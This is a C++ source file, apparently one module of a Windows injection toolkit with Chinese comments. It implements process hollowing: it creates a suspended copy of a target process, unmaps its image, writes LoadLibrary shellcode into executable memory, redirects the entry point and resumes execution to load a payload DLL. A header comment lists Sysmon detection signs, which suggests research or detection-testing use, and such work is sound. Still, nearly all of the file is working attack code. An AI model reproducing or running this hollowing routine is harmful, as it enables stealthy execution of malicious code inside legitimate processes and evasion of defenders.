// ════════════════════════════════════════════════════════════════
//  方法 12: 进程替换 (Process Hollowing)
//
//  原理：
//    1. 以 CREATE_SUSPENDED 创建目标进程
//    2. ZwUnmapViewOfSection 取消映射原始代码
//    3. VirtualAllocEx 分配新内存
//    4. WriteProcessMemory 写入 payload DLL 的 PE 映像
//    5. SetThreadContext 修改入口点
//    6. ResumeThread 恢复执行
//
//    本方法将 payload.dll 包装成一个 EXE 的形态注入：
//    创建一个挂起的合法进程，替换其内存内容为 shellcode，
//    shellcode 调用 LoadLibrary 加载 payload.dll。
//
//  检测特征：
//    - Sysmon Event 1:  进程创建 + 挂起标志
//    - Sysmon Event 25: ProcessTampering (进程镂空检测)
//    - VirtualQueryEx:  原始模块被取消映射
//    - 内存扫描: 新的可执行内容替换原始代码
// ════════════════════════════════════════════════════════════════
#include "../methods.h"
#include "../shellcode.h"
#include <iostream>

// ntdll!ZwUnmapViewOfSection
typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

bool Inject_ProcessHollow(DWORD pid, const wchar_t* dllPath)
{
    Print(L"  [*] 进程替换 (Process Hollowing) → PID=%lu\n", pid);

    // 1. 获取目标进程路径
    HANDLE hTarget = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hTarget) { Print(L"  [!] OpenProcess 失败\n"); return false; }
    wchar_t targetExe[MAX_PATH]{};
    DWORD sz = MAX_PATH;
    QueryFullProcessImageNameW(hTarget, 0, targetExe, &sz);
    CloseHandle(hTarget);

    Print(L"  [+] 目标进程: %s\n", targetExe);

    // 2. 以 CREATE_SUSPENDED 创建同路径进程
    STARTUPINFOW si{ .cb = sizeof(si) };
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(targetExe, nullptr, nullptr, nullptr, FALSE,
        CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
    {
        Print(L"  [!] CreateProcess 失败: %lu\n", GetLastError());
        return false;
    }
    Print(L"  [+] 挂起进程已创建 PID=%lu\n", pi.dwProcessId);

    // 3. 获取挂起进程的 PEB，找到 ImageBase
    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    // 读取 PEB 中的 ImageBase
    // x64: PEB 地址在 Rdx; x86: PEB 地址在 Ebx
    LPVOID pPebBase = nullptr;
#ifdef _WIN64
    pPebBase = (LPVOID)ctx.Rdx;
    // PEB+0x10 = ImageBaseAddress
    LPVOID imageBase = nullptr;
    ReadProcessMemory(pi.hProcess, (LPVOID)((uintptr_t)pPebBase + 0x10),
                      &imageBase, 8, nullptr);
#else
    pPebBase = (LPVOID)ctx.Ebx;
    LPVOID imageBase = nullptr;
    ReadProcessMemory(pi.hProcess, (LPVOID)((uintptr_t)pPebBase + 0x08),
                      &imageBase, 4, nullptr);
#endif
    Print(L"  [+] 原始 ImageBase = %p\n", imageBase);

    // 4. ZwUnmapViewOfSection 取消映射原始代码
    auto ZwUnmap = (pZwUnmapViewOfSection)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "ZwUnmapViewOfSection");
    if (ZwUnmap)
    {
        NTSTATUS status = ZwUnmap(pi.hProcess, imageBase);
        Print(L"  [+] ZwUnmapViewOfSection → 0x%08X\n", status);
    }

    // 5. 在原 ImageBase 处分配新内存，写入 shellcode
    size_t dllPathBytes = (wcslen(dllPath) + 1) * sizeof(wchar_t);

#ifdef _WIN64
    constexpr auto& tmpl       = SHELLCODE_TEMPLATE_X64;
    constexpr int  loadLibOff  = SHELLCODE_LOADLIB_OFF_X64;
    constexpr int  exitCodeOff = SHELLCODE_EXITCODE_OFF_X64;
    constexpr int  stringOff   = SHELLCODE_STRING_OFF_X64;
    constexpr int  ptrSize     = 8;
#else
    constexpr auto& tmpl       = SHELLCODE_TEMPLATE_X86;
    constexpr int  loadLibOff  = SHELLCODE_LOADLIB_OFF_X86;
    constexpr int  exitCodeOff = SHELLCODE_EXITCODE_OFF_X86;
    constexpr int  stringOff   = SHELLCODE_STRING_OFF_X86;
    constexpr int  ptrSize     = 4;
#endif

    size_t totalSize = (stringOff + dllPathBytes + 15) & ~15;
    std::vector<uint8_t> shellcode(totalSize, 0);
    memcpy(shellcode.data(), tmpl, sizeof(tmpl));

    LPVOID pLoadLib = GetLoadLibraryAddr();
    LPVOID pExit    = GetExitThreadAddr();
    memcpy(shellcode.data() + loadLibOff, &pLoadLib, ptrSize);
    memcpy(shellcode.data() + exitCodeOff + ptrSize + 3, &pExit, ptrSize);
    memcpy(shellcode.data() + stringOff, dllPath, dllPathBytes);

    // 在原 ImageBase 处分配（或任意地址）
    LPVOID remoteCode = VirtualAllocEx(pi.hProcess, imageBase, totalSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteCode)
    {
        // 原地址分配失败，用任意地址
        remoteCode = VirtualAllocEx(pi.hProcess, nullptr, totalSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remoteCode)
    {
        Print(L"  [!] VirtualAllocEx 失败: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return false;
    }

    WriteProcessMemory(pi.hProcess, remoteCode, shellcode.data(), totalSize, nullptr);
    Print(L"  [+] Shellcode 已写入 @ %p\n", remoteCode);

    // 6. 修改入口点
#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteCode;
#else
    ctx.Eip = (DWORD)remoteCode;
#endif
    SetThreadContext(pi.hThread, &ctx);

    // 7. 恢复执行
    ResumeThread(pi.hThread);
    Print(L"  [+] 主线程已恢复执行\n");

    WaitForSingleObject(pi.hThread, 5000);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    Print(L"  [✓] 进程替换注入完成\n");
    return true;
}
